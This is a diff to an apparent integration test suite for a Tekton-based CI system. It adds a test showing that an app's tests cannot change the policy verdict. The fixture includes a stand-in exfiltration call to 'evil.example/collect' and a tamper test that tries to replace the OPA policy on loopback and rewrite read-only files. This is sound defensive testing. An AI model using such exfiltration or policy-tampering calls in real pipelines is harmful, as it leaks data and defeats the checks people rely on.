@@ -261,7 +261,7 @@ test('GREEN: a real git push starts a Tekton PipelineRun for that exact commit; 
   const fetchTr = trs.items.find((t) => t.metadata.labels['tekton.dev/pipelineTask'] === 'fetch')!;
   assert.equal(fetchTr.status.results?.find((r) => r.name === 'commit')?.value, sha, 'Tekton cloned exactly the pushed commit');
   const gatesTr = trs.items.find((t) => t.metadata.labels['tekton.dev/pipelineTask'] === 'gates')!;
-  assert.deepEqual(gatesTr.status.steps.map((s) => `${s.name}:${s.terminated?.exitCode}`), ['toolchain', 'install', ...REQUIRED_GATES, 'verdict'].map((n) => `${n}:0`));
+  assert.deepEqual(gatesTr.status.steps.map((s) => `${s.name}:${s.terminated?.exitCode}`), ['toolchain', 'copy', 'facts', 'policy', 'install', 'typecheck', 'lint', 'tests', 'build', 'verdict'].map((n) => `${n}:0`));
 
   // The pod that ran the app's code is restricted: no ServiceAccount token, non-root, no privilege escalation, no capabilities.
   const podName = kjson<{ items: { metadata: { name: string } }[] }>(['-n', NS, 'get', 'pod', '-l', `tekton.dev/pipelineRun=${rec.runRef},tekton.dev/pipelineTask=gates`]).items[0].metadata.name;
@@ -332,6 +332,38 @@ test('"Run checks" (the button) on a finished head starts a new attempt for the 
   const runs = runsOf(SLUG, green.sha);
   assert.equal(runs.length, 2);
   assert.ok(runs.some((x) => x.metadata.labels['soa.dev/trigger'] === 'button'));
+});
+
+test('NEGATIVE the app\'s tests cannot change the policy verdict: no policy server to reach, and the pushed tree they would rewrite is read-only', { skip, timeout: 1_500_000 }, async () => {
+  const app = join(clone, 'apps', SLUG);
+  const { sha, out } = await pushChange(clone, () => {
+    // A real policy violation (a fetch to an absolute URL outside the OS SDK) ...
+    writeFileSync(join(app, 'src', 'lib', 'violating.ts'), "export const leak = () => fetch('https://evil.example/collect');\n");
+    // ... and a test that tries everything it can to make the policy pass: replace the policy through an OPA server on loopback,
+    // rewrite the violating file in the pushed tree, reach the facts. The test PASSES only when every attempt is refused.
+    writeFileSync(join(app, 'tests', 'tamper.test.ts'), [
+      "import test from 'node:test';",
+      "import assert from 'node:assert/strict';",
+      "import fs from 'node:fs';",
+      "test('the policy and the pushed tree cannot be reached from here', async () => {",
+      "  await assert.rejects(fetch('http://127.0.0.1:8181/v1/policies/factory', { method: 'PUT', body: 'package factory\\n' }), 'nothing listens on loopback');",
+      "  await assert.rejects(fetch('http://127.0.0.1:8181/v1/data/factory', { method: 'PUT', body: '{}' }));",
+      "  assert.ok(fs.existsSync('/workspace/app/src/lib/violating.ts'), 'the pushed tree is mounted here');",
+      "  assert.throws(() => fs.writeFileSync('/workspace/app/src/lib/violating.ts', 'export const leak = 1;\\n'), /EROFS|EACCES/);",
+      "  assert.throws(() => fs.rmSync('/workspace/app/src/lib/violating.ts'), /EROFS|EACCES/);",
+      "  assert.throws(() => fs.writeFileSync('/facts/facts.json', '{\"files\":[]}'), 'the facts are not mounted in the app steps');",
+      "});",
+      '',
+    ].join('\n'));
+    execFileSync('git', ['-C', clone, 'add', 'apps/' + SLUG]);
+  }, 'test: try to change the policy verdict');
+  assert.match(out, /quality checks started/, `git said:\n${out}`);
+  const rec = await waitRecord(SLUG, sha);
+  const byId = Object.fromEntries(rec.checks.map((c) => [c.id, c]));
+  assert.equal(byId.tests.status, 'pass', `every tamper attempt was refused (the test passes only then): ${byId.tests.detail}`);
+  assert.equal(byId.policy.status, 'fail', 'the policy judged the pushed file, not what the test could have written');
+  assert.equal(byId.scan.status, 'pass');
+  assert.equal(recordVerdict(rec, sha).green, false);
 });
 
 test('NEGATIVE a forged toolchain: a lockfile that maps typescript to a package whose tsc exits 0 does not turn the type check green', { skip, timeout: 1_500_000 }, async () => {
